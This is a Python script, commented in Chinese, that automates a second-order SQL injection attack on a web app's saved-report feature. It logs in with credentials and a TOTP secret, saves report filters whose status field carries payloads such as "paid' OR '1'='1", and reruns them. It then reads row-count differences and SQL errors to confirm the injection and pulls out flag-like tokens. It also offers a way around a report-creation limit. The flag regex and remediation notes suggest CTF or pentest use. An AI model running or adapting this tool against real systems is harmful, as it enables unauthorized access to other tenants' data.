#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""report_probe.py —— 保存报表/定时报表的二阶注入取证。

模式：保存筛选器（创建时安全）→ 运行（重放时拼接）。
常见注入位：status/region/channel 等自由文本；dimension 往往是白名单。

用法：
  python report_probe.py --base https://host --email merchant@x --password ... \
      --totp-secret BASE32 --payload "paid' OR '1'='1" --payload "paid' AND 1=2"

  # 只运行已有报表（不新建，绕过“最多 N 条”限制）
  python report_probe.py ... --existing-id 2

输出：每个 payload 的创建结果、运行状态、行数/错误；不做破坏性写操作。
"""
import argparse
import html
import json
import os
import re
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import httpkit
from findings import FindingStore


def csrf_of(text):
    m = re.search(r'name=["\']_csrf["\']\s+value=["\']([^"\']+)["\']', text or "")
    return m.group(1) if m else None


def run_rows(page_text):
    rows = []
    for row in re.findall(r"<tr[^>]*>(.*?)</tr>", page_text or "", re.S):
        t = re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", row)).strip()
        if t:
            rows.append(t)
    return rows


def parse_run(page_text, name):
    rows = run_rows(page_text)
    hits = [t for t in rows if ("已完成" in t or "失败" in t)]
    for t in hits:
        if name in t:
            m = re.search(r"(已完成|失败)\s*[—-]?\s*(.*)", t)
            return {"row": t[:600], "status": m.group(1) if m else "unknown",
                    "detail": m.group(2) if m else ""}
    # 结果表不显示报表名时，退回最后一条结果行
    if hits:
        t = hits[-1]
        m = re.search(r"(已完成|失败)\s*[—-]?\s*(.*)", t)
        return {"row": t[:600], "status": m.group(1) if m else "unknown",
                "detail": m.group(2) if m else ""}
    return None


def make_client(args):
    c = httpkit.HttpClient(base_url=args.base, cookie=args.cookie,
                           cookie_jar=args.cookie_jar, rps=args.rps,
                           timeout=args.timeout, evidence_dir=args.evidence_dir)
    if args.email and not args.cookie_jar and not args.cookie:
        c.login(args.login_url, {"email": args.email, "password": args.password},
                csrf_url=args.login_url, totp_secret=args.totp_secret)
    return c


def create_report(c, args, name, status):
    page = c.get(args.list_path, tag="report-list")
    csrf = csrf_of(page["text"])
    if not csrf:
        return {"error": "no csrf; session invalid", "page": page["text"][:300]}
    data = {"_csrf": csrf, "name": name, "dimension": args.dimension,
            "status": status, "from": args.date_from, "to": args.date_to}
    r = c.post(args.create_path, data=data, headers={"Referer": args.base + args.list_path},
               tag="report-create-" + name)
    after = c.get(args.list_path, tag="report-list-after-create")
    ids = sorted({int(i) for i in re.findall(r"/reports/(\d+)/run", after["text"])})
    return {"create_status": r["status"], "create_url": r["url"], "ids": ids,
            "page": after["text"]}


COUNT_RE = re.compile(r"(\d+)\s*(?:行|组|rows?)", re.I)
ERR_RE = re.compile(r"(SyntaxError|OperationalError|GroupingError|SQLSTATE|"
                    r"Unknown column|syntax error|near \"[^\"]*\")", re.I)


def judge(line, counts):
    """把一个结果行转成 (count, verdict)。counts 是本次所有已观测行数。"""
    m = COUNT_RE.search(line or "")
    count = int(m.group(1)) if m else None
    err = ERR_RE.search(line or "")
    if err:
        return {"count": count, "verdict": "error-based", "error": err.group(1)}
    if count is not None and len(counts) >= 2:
        lo, hi = min(counts), max(counts)
        if hi >= lo * 2 and hi > lo + 3:
            verdict = "boolean-diff" if count == hi else "boolean-control"
            return {"count": count, "verdict": verdict, "min": lo, "max": hi}
    return {"count": count, "verdict": "inconclusive"}


def run_report(c, args, rid):
    page = c.get(args.list_path, tag="report-list-before-run")
    csrf = csrf_of(page["text"])
    if not csrf:
        return {"error": "no csrf"}
    r = c.post("%s/%d/run" % (args.create_path, rid), data={"_csrf": csrf},
               headers={"Referer": args.base + args.list_path}, tag="report-run-%d" % rid)
    time.sleep(args.wait)
    after = c.get(args.list_path, tag="report-list-after-run")
    return {"run_status": r["status"], "run_url": r["url"], "page": after["text"]}


def main():
    p = argparse.ArgumentParser(description="Second-order SQLi in saved reports")
    p.add_argument("--base", required=True)
    p.add_argument("--login-url", default="/login")
    p.add_argument("--email", default=None)
    p.add_argument("--password", default=None)
    p.add_argument("--totp-secret", default=None)
    p.add_argument("--cookie", default=None)
    p.add_argument("--cookie-jar", default=None)
    p.add_argument("--create-path", default="/supplier/reports")
    p.add_argument("--list-path", default="/supplier/reports")
    p.add_argument("--dimension", default="status")
    p.add_argument("--date-from", default="2026-01-01")
    p.add_argument("--date-to", default="2026-12-31")
    p.add_argument("--payload", action="append", default=[], help="status 字段载荷，可重复")
    p.add_argument("--name-prefix", default="probe")
    p.add_argument("--existing-id", type=int, default=None, help="只运行已有报表，不新建")
    p.add_argument("--wait", type=float, default=4)
    p.add_argument("--rps", type=float, default=1.0)
    p.add_argument("--timeout", type=float, default=45)
    p.add_argument("--out", default="report-findings.json")
    p.add_argument("--evidence-dir", default="report-raw")
    p.add_argument("--flag-regex", default=r"\b[A-Z][A-Z0-9_]{2,19}\{[ -~]{4,120}\}",
                   help="从运行结果里提取 flag/令牌的模式")
    args = p.parse_args()
    if not args.payload:
        args.payload = ["paid"]
    c = make_client(args)
    store = FindingStore(args.out)

    if args.existing_id:
        res = run_report(c, args, args.existing_id)
        page = res.get("page", "")
        parsed = parse_run(page, args.name_prefix) if page else None
        flags = re.findall(args.flag_regex,
                           html.unescape((parsed or {}).get("row", "") or page))
        print(json.dumps({"existing_id": args.existing_id, "run": res.get("run_status"),
                          "parsed": parsed, "flags": flags}, ensure_ascii=False, indent=2))
        store.add(module="report", title="已运行已有报表（二阶注入位点）",
                  severity="high" if flags else "info",
                  endpoint=args.base + args.create_path, method="POST",
                  confidence="confirmed" if flags else "surface",
                  evidence={"existing_id": args.existing_id, "run_status": res.get("run_status"),
                            "parsed": parsed, "flags": flags},
                  impact=("重放时执行并回显敏感数据/flag。" if flags else
                          "需要观察运行结果/错误来判断是否注入。"),
                  remediation="筛选器存储前做类型/枚举校验；重放时使用参数化查询；报表查询加租户过滤。",
                  tags=["report", "second-order"])
        store.save()
        return

    outcomes = []
    for i, payload in enumerate(args.payload, 1):
        name = "%s-%d" % (args.name_prefix, i)
        cr = create_report(c, args, name, payload)
        if "error" in cr:
            print("CREATE ERR", cr["error"]); continue
        ids = cr.get("ids") or []
        if not ids:
            print("CREATE no new report (limit/rejected):", cr.get("create_status"),
                  re.sub(r"\s+", " ", html.unescape(re.sub(r"<[^>]+>", " ", cr.get("page", ""))))[-200:])
            continue
        rid = max(ids)
        rr = run_report(c, args, rid)
        page = rr.get("page", "")
        parsed = parse_run(page, name) or {}
        line = parsed.get("row", "")
        flags = re.findall(args.flag_regex, html.unescape(line or page))
        print("PAYLOAD", i, "report", rid, "|", parsed.get("status"), "|", line[:260],
              "| flags", flags)
        outcomes.append({"index": i, "payload": payload, "report_id": rid,
                         "run_status": rr.get("run_status"), "line": line[:600],
                         "flags": flags})

    counts = [judge(o["line"], [])["count"] for o in outcomes]
    counts = [n for n in counts if n is not None]
    confirmed = []
    for o in outcomes:
        verdict = judge(o["line"], counts)
        high = verdict["verdict"] in ("error-based", "boolean-diff") or bool(o["flags"])
        if high:
            confirmed.append(o)
        store.add(module="report",
                  title="保存报表二阶注入：%s" % verdict["verdict"],
                  severity="high" if high else "info",
                  endpoint=args.base + args.create_path, method="POST",
                  confidence="confirmed" if high else "needs-review",
                  evidence={"payload": o["payload"], "report_id": o["report_id"],
                            "run_status": o["run_status"], "verdict": verdict,
                            "flags": o["flags"], "result": o["line"]},
                  impact=("保存时未拦截、重放时拼接执行，可读跨租户/跨状态数据。"
                          if high else "结果未见行数差异或报错；换布尔/报错载荷再试。"),
                  remediation="筛选器存储前做类型/枚举校验；重放时使用参数化查询；报表查询加租户过滤。",
                  tags=["report", "second-order", "sqli"])
    if confirmed:
        store.add(module="report", title="保存报表二阶注入（已确认）", severity="high",
                  endpoint=args.base + args.create_path, method="POST", confidence="confirmed",
                  evidence={"payloads": [o["payload"] for o in confirmed],
                            "counts": counts,
                            "flags": [f for o in confirmed for f in o["flags"]],
                            "reports": [o["report_id"] for o in confirmed]},
                  impact="同一筛选器的布尔/报错载荷在重放阶段产生显著行数差异或 SQL 报错。",
                  remediation="同上报；修复后重放同一批报表验证行数回落。",
                  tags=["report", "second-order", "sqli", "confirmed"])
    store.save()
    print(json.dumps(store.summary(), ensure_ascii=False))
    print("findings:", os.path.abspath(args.out))


if __name__ == "__main__":
    main()
